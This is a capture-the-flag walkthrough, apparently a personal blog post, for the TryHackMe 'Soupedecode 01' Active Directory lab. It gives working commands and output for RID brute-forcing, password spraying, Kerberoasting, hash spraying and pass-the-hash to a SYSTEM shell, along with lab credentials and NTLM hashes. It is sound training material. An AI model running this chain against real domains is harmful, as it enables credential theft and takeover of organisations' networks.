---
title: 'TryHackMe: Soupedecode 01 CTF Walkthrough'
author: 0xcrax
categories: [TryHackMe]
tags: [windows, rustscan, SMB, enum4linux, nxc, netexec, smbclient, impacket, impacket-smbclient, impacket-smbexec, impacket-psexec, impacket-GetUserSPNs, john, hashcat, rid-brute, Password Spraying, Hash Spraying, crackmapexec, Kerberoasting, kerbrute, kerberoast, SPN, TGS, Kerberoastable, AS-REP Roasting, AD, DC, Active Directory, pass-the-hash, RCE]
render_with_liquid: true
img_path: /images/TryHackMe/Soupedecode01
image:
  path: /images/TryHackMe/Soupedecode01/room_image.webp
---

🧰 Writeup Overview

This writeup details the step-by-step exploitation of an Active Directory(`AD`) environment vulnerable to `Kerberos attacks`, with a focus on `AS-REP Roasting`. It covers the initial reconnaissance identifying open `AD`-related services like `Kerberos`, `LDAP`, and `SMB`. Using these, the attacker extracts encrypted ticket hashes from service accounts without pre-authentication, then cracks them offline to reveal passwords. Finally, the writeup demonstrates post-exploitation techniques including `SMB` access and lateral movement, highlighting common weaknesses in `AD` setups and how to detect and exploit them.

<a href="https://tryhackme.com/r/room/soupedecode01" target="_blank" class="box-button" data-mobile-text="Soupedecode CTF Challenge | TryHackMe" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #2a0e0e 0%, #1a0505 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3); color: #ff4444; text-decoration: none; font-family: Arial, sans-serif; font-weight: bold; border: 1px solid #ff5555; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 25px rgba(255, 0, 0, 0.7)'; this.style.color='#ffffff';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(255, 0, 0, 0.3)'; this.style.color='#ff4444';">
<span>Soupedecode CTF Challenge | TryHackMe</span>
<img src="/images/TryHackMe/THM.webp" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; filter: hue-rotate(300deg) brightness(0.9); transition: all 0.3s ease;" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='hue-rotate(320deg) brightness(1.3)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='hue-rotate(300deg) brightness(0.9)';">
</a>

## Reconnaissance

### Rustscan 

```sh
rustscan -a 10.10.150.50 — range 1–65535
```

![](/images/TryHackMe/Soupedecode01/ports.png)

---

```sh
rustscan -a 10.10.150.50 -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49667,49675,49721,49794 -- -Pn -A -n -sCV -T4
```

**Summary of scanning**
```console
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-11 04:18:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? 
464/tcp   open  kpasswd5?     
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_ssl-date: 2025-08-11T04:20:17+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Issuer: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49721/tcp open  msrpc         Microsoft Windows RPC
49794/tcp open  msrpc         Microsoft Windows RPC

Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Since we are dealing with a Domain Controller, let's add **hostname** `DC01.SOUPEDECODE.LOCAL` & **domain name** `SOUPEDECODE.LOCAL` into /etc/hosts:

```
10.10.150.50    DC01.SOUPEDECODE.LOCAL    SOUPEDECODE.LOCAL
```
{: file="/etc/hosts" }

### Enumerating SMB Shares

#### null authentication
Let's see if we can list the shares using null authentication

#### option |
Using <a href="https://www.kali.org/tools/enum4linux/" target="_blank">enum4linux</a>

```sh
enum4linux -U -S SOUPEDECODE.LOCAL
```
![](/images/TryHackMe/Soupedecode01/enum4linux1.png)

---

#### option ||
Using <a href="https://linuxcommandlibrary.com/man/nxc" target="_blank">nxc</a>(<a href="https://www.netexec.wiki/" target="_blank"> netexec </a>)

```sh
nxc smb DC01.SOUPEDECODE.LOCAL -u '' -p '' --shares
```
As you see there is `Windows Server 2022`
```sh
SMB         10.10.150.50    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.150.50    445    DC01             [-] SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED 
SMB         10.10.150.50    445    DC01             [-] Error enumerating shares: Error occurs while reading from remote(104)
```

#### guest authentication
Let's list the shares using `guest` authentication without password

#### option |
Using <a href="https://tools.thehacker.recipes/impacket/examples/smbclient.py" target="_blank">smbclient</a> But this option doesn't show permissions
```sh
smbclient -L //SOUPEDECODE.LOCAL -U guest
```

You can use `guest%\n` instead `guest` to connect directly

---

```sh
Password for [WORKGROUP\guest]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
```

#### option ||
Using `nxc`

```sh
nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --shares
```

The `guest` user is allowed and grants us read access to the `IPC$` share.

```sh
SMB         10.10.150.50    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.150.50    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.10.150.50    445    DC01             [*] Enumerated shares
SMB         10.10.150.50    445    DC01             Share           Permissions     Remark
SMB         10.10.150.50    445    DC01             -----           -----------     ------
SMB         10.10.150.50    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.150.50    445    DC01             backup                          
SMB         10.10.150.50    445    DC01             C$                              Default share
SMB         10.10.150.50    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.150.50    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.150.50    445    DC01             SYSVOL                          Logon server share 
SMB         10.10.150.50    445    DC01             Users         
```

---

### Discover Usernames

#### option |

```sh
kerbrute userenum -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc DC01.SOUPEDECODE.LOCAL
```
{: .wrap }

But sadly this option takes a lot of time

![](/images/TryHackMe/Soupedecode01/kerbrute.png)

---

#### option ||
We can Leveraging our access to the `IPC$` share, to perform a `RID brute-force` attack against a domain controller `DC01.SOUPEDECODE.LOCAL` with the `guest` account to enumerate domain users.
```sh
nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --rid-brute 2500
```

```sh
SMB         10.10.150.50    445    DC01             1416: SOUPEDECODE\mpeter317 (SidTypeUser)
SMB         10.10.150.50    445    DC01             1417: SOUPEDECODE\bpenny318 (SidTypeUser)
...
SMB         10.10.150.50    445    DC01             1418: SOUPEDECODE\fian319 (SidTypeUser)
SMB         10.10.150.50    445    DC01             1419: SOUPEDECODE\atara320 (SidTypeUser)
...
SMB         10.10.150.50    445    DC01             1420: SOUPEDECODE\vnoah321 (SidTypeUser)
SMB         10.10.150.50    445    DC01             1421: SOUPEDECODE\prachel322 (SidTypeUser)
...
```

Extract usernames from the output (removing domain prefixes and extra info), and saves them into `rids.txt`
```sh
nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --rid-brute 2500 | cut -d '\' -f 2 | cut -d ' ' -f 1 > rids.txt
```
{: .wrap }

---

## User Flag

### Password Spraying

Using <a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html" target="_blank">ASREPRosting</a> and spraying the common password yielded no results.
Spraying "username=password" succeeded, revealing valid credentials for user `ybob317`

#### option | nxc
```sh
nxc smb DC01.SOUPEDECODE.LOCAL -u rids.txt -p rids.txt --no-bruteforce --continue-on-success
```

![](/images/TryHackMe/Soupedecode01/ybob.png)

---

#### option || crackmapexec
same nxc
```sh
crackmapexec smb DC01.SOUPEDECODE.LOCAL -u rids.txt -p rids.txt --no-bruteforce --continue-on-success
```

---
 
#### option ||| kerbrute

```sh
kerbrute passwordspray --user-as-pass -d SOUPEDECODE.LOCAL --dc DC01.SOUPEDECODE.LOCAL rids.txt -v
```

---

### Authentication with SMB

```sh
nxc smb SOUPEDECODE.LOCAL -u ybob317 -p ybob317 --shares
```

The valid `ybob317` credentials worked, showing read access to key shares including `NETLOGON`, `SYSVOL`, and `Users`, which may store sensitive files.

```sh
SMB         10.10.150.50    445    DC01             Share           Permissions     Remark
SMB         10.10.150.50    445    DC01             -----           -----------     ------
SMB         10.10.150.50    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.150.50    445    DC01             backup                          
SMB         10.10.150.50    445    DC01             C$                              Default share
SMB         10.10.150.50    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.150.50    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.150.50    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.150.50    445    DC01             Users           READ 
```

Connected to SMB as `ybob317`, accessed the `Users` share, navigated to the user’s Desktop, and retrieved `user.txt`.

```sh
impacket-smbclient 'SOUPEDECODE.LOCAL/ybob317:ybob317@SOUPEDECODE.LOCAL'
```

![](/images/TryHackMe/Soupedecode01/user-flag.png)

---

## Root Flag

### <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/" target="_blank">Kerberoasting</a>

You can check here About <a href="https://adsecurity.org/?p=2293" target="_blank">Cracking Kerberos TGS Tickets</a> & <a href="https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names" target="_blank">SPN</a> & <a href="https://www.vaadata.com/blog/what-is-kerberos-kerberos-authentication-explained/" target="_blank">Kerberos Authentication</a>

Since we have a valid domain credentials, we check for `Kerberoastable` accounts using `GetUserSPNs`

so we request a Kerberos service ticket for one or more of these identified accounts from the ticket granting service `TGS` from `SPN` using `GetUserSPNs`

```sh
impacket-GetUserSPNs 'SOUPEDECODE.LOCAL/ybob317:ybob317' -request -usersfile rids.txt -dc-ip SOUPEDECODE.LOCAL -outputfile hashes-kerberoastables.txt
```
{: .wrap }

OR the best use this

```sh
impacket-GetUserSPNs 'SOUPEDECODE.LOCAL/ybob317:ybob317' -request -dc-ip SOUPEDECODE.LOCAL -outputfile hashes-kerberoastables.txt
```
{: .wrap }

![](/images/TryHackMe/Soupedecode01/GetUserSPNs.png)

---

```sh
cat hashes-kerberoastables.txt | grep file_svc > file_svc.tgs
```

```sh
head -c 30 file_svc.tgs
```

Now Using John the Ripper OR Hashcat with the RockYou wordlist to crack the `Kerberos TGS ticket` hash, successfully revealing the password

![](/images/TryHackMe/Soupedecode01/pass.png)

---

### Accessing the Backup Share

With the `file_svc` account, we enumerate SMB shares again and discover that we now have read access to the `backup` share.

```sh
nxc smb SOUPEDECODE.LOCAL -u 'file_svc' -p 'P******!!' --shares
```


![](/images/TryHackMe/Soupedecode01/file_svc.png)

---

Extact `backup_extract.txt`

```sh
smbclient //$(IP)/backup -U 'SOUPEDECODE.LOCAL\file_svc'
```

OR

```sh
impacket-smbclient 'SOUPEDECODE.LOCAL/file_svc:Password123!!@dc01.soupedecode.local'
```
{: .wrap }

```sh
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use backup
# ls
drw-rw-rw-          0  Mon Jun 17 17:41:17 2024 .
drw-rw-rw-          0  Fri Jul 25 17:51:20 2025 ..
-rw-rw-rw-        892  Mon Jun 17 17:41:23 2024 backup_extract.txt
# get backup_extract.txt
```

The file contains a list of account names and their corresponding `NTLM hashes`.

```sh
cat backup_extract.txt                                                                                     
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

Let’s parse the file to separate list for accounts and NTLM hashes.


```sh
cat backup_extract.txt | cut -d ':' -f 1 > machines.txt                                                    
```

```sh
cat backup_extract.txt | cut -d ':' -f 4 | awk '{print "00000000000000000000000000000000:"$1}' > hashes.txt
```

```sh
cat backup_extract.txt | cut -d ':' -f 4 > hashes.txt 
```

![](/images/TryHackMe/Soupedecode01/cut-awk.png)

---

### Hash Spraying
We discovered that the hash for the `FileServer$` account is valid and grants us access.

```sh
nxc smb SOUPEDECODE.LOCAL -u machines.txt -H hashes.txt --no-bruteforce     
```

```sh
SMB         10.10.150.50    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.150.50    445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE
SMB         10.10.150.50    445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE
SMB         10.10.150.50    445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
SMB         10.10.150.50    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```


### Administrator Access

The `FileServer$` account hash provided administrator-level access to over `DC`, Notice the tag `(Pwn3d!)`that indicates what I'm saying.
With this privilege, we can either execute commands remotely via impacket-psexec `RCE` or browse administrative shares like `C$`.

```sh
nxc smb SOUPEDECODE.LOCAL -u FileServer$ -H e41da7e79a4c76dbd9cf79d1cb325559 --shares 
```

![](/images/TryHackMe/Soupedecode01/FileServer.png)

---

#### option | RCE impacket-psexec

```sh
impacket-psexec 'FileServer$@SOUPEDECODE.LOCAL' -hashes ':e41da7e79a4c76dbd9cf79d1cb325559'
```
{: .wrap }

![](/images/TryHackMe/Soupedecode01/RCE.png)

---

#### option || RCE impacket-smbexec

```sh
impacket-smbexec -hashes :e41da7e79a4c76dbd9cf79d1cb325559 'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'
```

```sh
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>[-] 
```

#### option ||| C$ share 

Alternatively, browse administrative shares via `SMB`  like `C$` then get the flag directly:

```sh
impacket-smbclient -hashes :e41da7e79a4c76dbd9cf79d1cb325559 'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'
```

![](/images/TryHackMe/Soupedecode01/root-smb.png)

<div class="gif-container">
<img src="/gifs/crazy.gif" alt="GIF" class="gif-responsive">
</div>

---

<style>
img {
  transition: all 0.3s ease;
}

img:hover {
  transform: scale(1.05);
  filter: brightness(90%);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0);
}

img:center {
  display: block;
  margin-left: auto;
  margin-right: auto;
}

.wrap pre {
  white-space: pre-wrap;
}

.gif-container {
    text-align: center;
    margin: 30px 0;
}

.gif-responsive {
    width: 100%;
    max-width: 800px;
    height: 450px;
    border-radius: 12px;
    object-fit: cover;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0);
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.gif-responsive:hover {
    transform: scale(1.02);
    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
}

/* Additional video styles */
.video-container {
  text-align: center;
  margin: 30px auto;        /* centers inside post */
  max-width: 800px;         /* keeps container from being huge */
}

.video-responsive {
  width: 100%;              /* fill container */
  aspect-ratio: 16 / 9;    /* keeps correct proportions on desktop */
  border-radius: 12px;
  object-fit: cover;
  box-shadow: 0 10px 25px rgba(0.1, 0.1, 0, 0.1);
  transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.video-responsive:hover {
  transform: scale(1.02);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
}

/* Mobile Responsive Styles */
@media screen and (max-width: 768px) {
    .gif-responsive {
    width: 100% !important;
    max-width: 100% !important;
    height: auto !important;
  }

  .video-responsive {
    width: 100% !important;
    max-width: 100% !important;
    aspect-ratio: auto;  /* let phone use natural aspect ratio */
    height: auto !important;
  }
  
  .box-button {
    max-width: 100% !important;
    width: 100% !important;
    padding: 10px 14px !important;
    justify-content: center !important;
    gap: 6px !important;
    position: relative;
  }
  /* Hide desktop text on mobile */
  .box-button span {
    display: none !important;
  }

  /* Show mobile text from data attribute */
  .box-button::after {
    content: attr(data-mobile-text) !important;
    font-size: 10px !important;
    text-align: center !important;
    white-space: nowrap !important;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
    font-weight: 1000 !important;
  }

      /* DEFAULT: Use #a1a1a1 for most buttons */
    .box-button::after {
      color: #a1a1a1 !important;
    }

    /* Specific color overrides for each button style */
    
    /* CYBER BLUE NEON - Blue text */
    .box-button[style*="color: #00ccff"]::after,
    .box-button[style*="color:#00ccff"]::after {
      color: #00ccff !important;
    }

    /* HACKER GREEN TERMINAL - Green text */
    .box-button[style*="color: #00ff88"]::after,
    .box-button[style*="color:#00ff88"]::after {
      color: #00ff88 !important;
    }

    /* PURPLE NEON LIGHT - Purple text */
    .box-button[style*="color: #cc00ff"]::after,
    .box-button[style*="color:#cc00ff"]::after {
      color: #cc00ff !important;
    }

    /* RED ALERT GLOW - Red text (#ff4444) */
    .box-button[style*="color: #ff4444"]::after,
    .box-button[style*="color:#ff4444"]::after,
    .box-button[style*="color: #ff5555"]::after,
    .box-button[style*="color:#ff5555"]::after {
      color: #ff4444 !important;
    }

    /* ORANGE SUNLIGHT - Orange text */
    .box-button[style*="color: #ffaa00"]::after,
    .box-button[style*="color:#ffaa00"]::after {
      color: #ffaa00 !important;
    }

    /* MINIMAL LIGHT SHINE - Dark text for light background */
    .box-button[style*="background: #ffffff"]::after,
    .box-button[style*="background:#ffffff"]::after,
    .box-button[style*="color: #333333"]::after,
    .box-button[style*="color:#333333"]::after {
      color: #333333 !important;
    }

    /* TEAL CYBER GLOW - Teal text */
    .box-button[style*="color: #5eead4"]::after,
    .box-button[style*="color:#5eead4"]::after {
      color: #5eead4 !important;
    }

    /* PINK NEON LIGHT - Pink text */
    .box-button[style*="color: #f9a8d4"]::after,
    .box-button[style*="color:#f9a8d4"]::after {
      color: #f9a8d4 !important;
    }

    /* FOREST GREEN LIGHT - Lime text */
    .box-button[style*="color: #bef264"]::after,
    .box-button[style*="color:#bef264"]::after {
      color: #bef264 !important;
    }

    /* DARK RED WINE GLOW - Light red text */
    .box-button[style*="color: #fecaca"]::after,
    .box-button[style*="color:#fecaca"]::after {
      color: #fecaca !important;
    }

    /* LIGHT BLUE SKY SHINE - Blue text */
    .box-button[style*="color: #1e40af"]::after,
    .box-button[style*="color:#1e40af"]::after {
      color: #1e40af !important;
    }

    /* DARK ORANGE GLOW - Orange text */
    .box-button[style*="color: #fdba74"]::after,
    .box-button[style*="color:#fdba74"]::after {
      color: #fdba74 !important;
    }

    /* CYBER YELLOW - Yellow text */
    .box-button[style*="color: #fef08a"]::after,
    .box-button[style*="color:#fef08a"]::after {
      color: #fef08a !important;
    }

    /* DEEP SPACE - Purple text */
    .box-button[style*="color: #9370db"]::after,
    .box-button[style*="color:#9370db"]::after {
      color: #9370db !important;
    }

    /* ELECTRIC PINK - Pink text */
    .box-button[style*="color: #e879f9"]::after,
    .box-button[style*="color:#e879f9"]::after {
      color: #e879f9 !important;
    }

    /* LAVA RED - Light red text */
    .box-button[style*="color: #fca5a5"]::after,
    .box-button[style*="color:#fca5a5"]::after {
      color: #fca5a5 !important;
    }

    /* AQUA MARINE - Teal text */
    .box-button[style*="color: #99f6e4"]::after,
    .box-button[style*="color:#99f6e4"]::after {
      color: #99f6e4 !important;
    }

    /* ROYAL PURPLE - Light purple text */
    .box-button[style*="color: #d8b4fe"]::after,
    .box-button[style*="color:#d8b4fe"]::after {
      color: #d8b4fe !important;
    }

    /* EMERALD GREEN - Green text */
    .box-button[style*="color: #6ee7b7"]::after,
    .box-button[style*="color:#6ee7b7"]::after {
      color: #6ee7b7 !important;
    }

    /* MIDNIGHT BLUE - Light blue text */
    .box-button[style*="color: #93c5fd"]::after,
    .box-button[style*="color:#93c5fd"]::after {
      color: #93c5fd !important;
    }

    /* Light backgrounds with colored text - use original colors */
    .box-button[style*="background: linear-gradient(135deg, #fef3c7"]::after,
    .box-button[style*="background: linear-gradient(135deg, #fde68a"]::after,
    .box-button[style*="background: linear-gradient(135deg, #f8fafc"]::after,
    .box-button[style*="background: linear-gradient(135deg, #dbeafe"]::after,
    .box-button[style*="background: linear-gradient(135deg, #bfdbfe"]::after {
      color: #333333 !important; /* Dark text for better contrast on light backgrounds */
    }

  .box-button img {
    width: 28px !important;
    height: 28px !important;
    margin-right: 0 !important;
  }
}
/* Desktop Styles */
@media screen and (min-width: 769px) {
  .box-button::after {
    display: none !important;
  }
  
  .box-button span {
    display: inline !important;
  }
}
</style>
<script>
// Function to make only .redirect class links open in new tabs, but not work here actually i don'know why
document.querySelectorAll('a.redirect').forEach(link => {
    link.setAttribute('target', '_blank');
    link.setAttribute('rel', 'noopener noreferrer');
});
</script>
